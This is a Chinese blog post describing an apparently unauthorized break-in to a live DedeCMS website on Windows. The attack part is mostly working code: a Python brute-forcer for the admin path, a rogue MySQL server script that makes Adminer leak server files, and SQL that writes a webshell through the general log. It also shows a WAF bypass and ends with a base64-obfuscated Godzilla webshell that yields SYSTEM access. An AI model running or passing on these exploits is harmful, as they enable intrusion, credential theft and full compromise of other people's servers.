<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>又是无聊的一天打开高危扫描器开扫，结果啥也没扫出来，然后就开始苦逼的一个一个站看了。然后发现下面这个站dedecms，服务器windows<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599049061779-0d7b7a81-2ef2-4147-98b8-f206532847a6.png#align=left&amp;display=inline&amp;height=533&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=710&amp;originWidth=1265&amp;size=53491&amp;status=done&amp;style=none&amp;width=949"/>各种历史洞打了一遍都没用，因为是windows可以用这个跑下后台</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">itertools</span>
<span class="n">characters</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyz0123456789_!#"</span>
<span class="n">back_dir</span> <span class="o">=</span> <span class="s2">""</span>
<span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://www.test.com/tags.php"</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"_FILES[mochazz][tmp_name]"</span> <span class="p">:</span> <span class="s2">"./{p}&lt;&lt;/images/adminico.gif"</span><span class="p">,</span>
    <span class="s2">"_FILES[mochazz][name]"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="s2">"_FILES[mochazz][size]"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="s2">"_FILES[mochazz][type]"</span> <span class="p">:</span> <span class="s2">"image/gif"</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">7</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="k">for</span> <span class="n">pre</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">characters</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
        <span class="n">pre</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">pre</span><span class="p">))</span>
        <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">pre</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"testing"</span><span class="p">,</span><span class="n">pre</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">"Upload filetype not allow !"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="n">back_dir</span> <span class="o">=</span> <span class="n">pre</span>
            <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"./{p}&lt;&lt;/images/adminico.gif"</span>
            <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"./{p}&lt;&lt;/images/adminico.gif"</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"[+] 前缀为："</span><span class="p">,</span><span class="n">back_dir</span><span class="p">)</span>
<span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="n">characters</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="k">break</span>
        <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">back_dir</span><span class="o">+</span><span class="n">ch</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">"Upload filetype not allow !"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="n">back_dir</span> <span class="o">+=</span> <span class="n">ch</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">"[+] "</span><span class="p">,</span><span class="n">back_dir</span><span class="p">)</span>
            <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"./{p}&lt;&lt;/images/adminico.gif"</span>
            <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">data</span><span class="p">[</span><span class="s2">"_FILES[mochazz][tmp_name]"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"./{p}&lt;&lt;/images/adminico.gif"</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"后台地址为："</span><span class="p">,</span><span class="n">back_dir</span><span class="p">)</span>
</pre></div>
<p>结果跑完居然是dede，这就扯了我访问dede是404.<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599049494176-8de4b6e9-8c69-443e-b309-fac63f911e11.png#align=left&amp;display=inline&amp;height=111&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=111&amp;originWidth=322&amp;size=5117&amp;status=done&amp;style=none&amp;width=322"/>如果找到后台的话还可以用这个洞猜一下管理员账号：<br/>
<a href="http://www.yulegeyu.com/2018/09/20/dedecms-guess-admin-username-trick/" target="_blank">http://www.yulegeyu.com/2018/09/20/dedecms-guess-admin-username-trick/</a><br/>
山穷水尽了随手试了一下adminer.php居然存在（扫描器里有adminer.php的估计扫的目录太多了被封ip了所以不要相信扫描器）<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599049743130-8a3ef831-ecc5-419c-a265-ec82d05cef11.png#align=left&amp;display=inline&amp;height=373&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=373&amp;originWidth=591&amp;size=20333&amp;status=done&amp;style=none&amp;width=591"/><br/>
adminer低版本可以利用mysql服务端恶意读取客户端文件<br/>
mysql_client.py代码</p>
<div class="highlight"><pre><span></span><span class="c1">#coding=utf-8 </span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">logging</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>

<span class="n">filename</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">sv</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
<span class="n">sv</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="n">sv</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">""</span><span class="p">,</span><span class="mi">3306</span><span class="p">))</span>
<span class="n">sv</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">conn</span><span class="p">,</span><span class="n">address</span><span class="o">=</span><span class="n">sv</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'Conn from: </span><span class="si">%r</span><span class="s1">'</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s2">"</span><span class="se">\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00</span><span class="s2">"</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">)</span>
<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"auth okay"</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s2">"</span><span class="se">\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00</span><span class="s2">"</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">)</span>
<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"want file..."</span><span class="p">)</span>
<span class="n">wantfile</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s2">"</span><span class="se">\x00\x00\x01\xFB</span><span class="s2">"</span><span class="o">+</span><span class="n">filename</span>
<span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">wantfile</span><span class="p">)</span>
<span class="n">content</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">)</span>
<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p>使用方法直接服务器执行<br/>
python mysql_client.py "F:\dede\index.php"<br/>
然后adminer填你服务器地址，账号密码随便填连接就读到了文件，服务器3306端口要对外开放<br/>
然后就是又开始读文件了，先随意读一下，让它报出web路径来<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599049805348-5356c7bd-bc1b-4c10-ad15-98f7093d9d0e.png#align=left&amp;display=inline&amp;height=104&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=104&amp;originWidth=459&amp;size=3611&amp;status=done&amp;style=none&amp;width=459"/><img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599049877241-5abf88f7-dfe6-4a90-9f24-855f9a193208.png#align=left&amp;display=inline&amp;height=156&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=156&amp;originWidth=650&amp;size=13451&amp;status=done&amp;style=none&amp;width=650"/>因为是dedecms所以直接读 <code>data\common.inc.php</code><img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599050019279-8968174d-6f45-4964-acbd-42dc1ddd9a1c.png#align=left&amp;display=inline&amp;height=115&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=115&amp;originWidth=584&amp;size=9837&amp;status=done&amp;style=none&amp;width=584"/>文件不存在？直接放F盘下读一下<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599050222473-d527c103-2fb6-4c6d-b7e7-184a675df94f.png#align=left&amp;display=inline&amp;height=229&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=229&amp;originWidth=566&amp;size=16068&amp;status=done&amp;style=none&amp;width=566"/>发现账号为root，直接登录adminer.php通过日志getshell<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599050299557-a1cf6cbd-f2c6-4876-96a1-db1a62824f80.png#align=left&amp;display=inline&amp;height=352&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=352&amp;originWidth=668&amp;size=29865&amp;status=done&amp;style=none&amp;width=668"/><code>set global general_log=on</code> 开启general log模式<code>set global general_log_file='F:\\*****\\shell.php';</code> 设置日志路径<code>select '&lt;?php eval($_POST['pwd']);?&gt;';</code> 写shell毫无疑问最后这里被拦了，抓个包来测吧，<code>select '&lt;?php '</code>不拦<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599051064975-3478cc3a-58d7-44b9-8968-3f96aaa7b031.png#align=left&amp;display=inline&amp;height=247&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=247&amp;originWidth=914&amp;size=53813&amp;status=done&amp;style=none&amp;width=914"/><code>select+'&lt;?php+phpinfo();+?&gt;'</code>拦掉<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599051125532-8dc67bde-5c9a-4e60-843a-127142b8d282.png#align=left&amp;display=inline&amp;height=210&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=210&amp;originWidth=530&amp;size=11832&amp;status=done&amp;style=none&amp;width=530"/>使用注释换行绕过<code>select+'&lt;?php+//%0Aphpinfo();+?&gt;'</code><img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599051251701-55883101-4e9f-4fab-bc98-52e21a88f9d2.png#align=left&amp;display=inline&amp;height=295&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=295&amp;originWidth=996&amp;size=61910&amp;status=done&amp;style=none&amp;width=996"/>写个哥斯拉的马</p>
<div class="highlight"><pre><span></span><span class="x">select '</span><span class="cp">&lt;?php</span> <span class="c1">//"%0A$a="ICAgIHNlc3Npb25fc3RhcnQoKTsKICAgIEBzZXRfdGltZV9saW1pdCgwKTsKCUBlcnJvcl9yZXBvcnRpbmcoMCk7CiAgICBmdW5jdGlvbiBFKCRELCRLKXsKICAgICAgICBmb3IoJGk9MDskaTxzdHJsZW4oJEQpOyRpKyspIHsKICAgICAgICAgICAgJERbJGldID0gJERbJGldXiRLWyRpKzEmMTVdOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJEQ7CiAgICB9CiAgICBmdW5jdGlvbiBRKCREKXsKICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkRCk7CiAgICB9CiAgICBmdW5jdGlvbiBPKCREKXsKICAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgkRCk7CiAgICB9CiAgICAkUD0nd2hvYW1pJzsKICAgICRWPSdwYXlsb2FkJzsKICAgICRUPScxYjA2NzliZTcyYWQ5NzZhJzsKICAgIGlmIChpc3NldCgkX1BPU1RbJFBdKSl7CiAgICAgICAgJEY9TyhFKE8oJF9QT1NUWyRQXSksJFQpKTsKICAgICAgICBpZiAoaXNzZXQoJF9TRVNTSU9OWyRWXSkpewogICAgICAgICAgICAkTD0kX1NFU1NJT05bJFZdOwogICAgICAgICAgICAkQT1leHBsb2RlKCd8JywkTCk7CiAgICAgICAgICAgIGNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIG52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgICAgICAgICAgJFI9bmV3IEMoKTsKCQkJJFItPm52b2tlKCRBWzBdKTsKICAgICAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRQLiRUKSwwLDE2KTsKICAgICAgICAgICAgZWNobyBRKEUoQHJ1bigkRiksJFQpKTsKICAgICAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRQLiRUKSwxNik7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICRfU0VTU0lPTlskVl09JEY7CiAgICAgICAgfQogICAgfQ==";eval%01(base64_decode%01($a));//"; ?&gt;'</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599051372932-e27cfaf7-acf3-4430-9579-ec05309a51ad.png#align=left&amp;display=inline&amp;height=481&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=481&amp;originWidth=1016&amp;size=144350&amp;status=done&amp;style=none&amp;width=1016"/>成功连上，system<img src="https://cdn.nlark.com/yuque/0/2020/png/601717/1599051485427-5bfff367-49d1-4e94-9069-2609fa4af50b.png#align=left&amp;display=inline&amp;height=145&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=145&amp;originWidth=403&amp;size=10837&amp;status=done&amp;style=none&amp;width=403"/></p>
</div>
</div>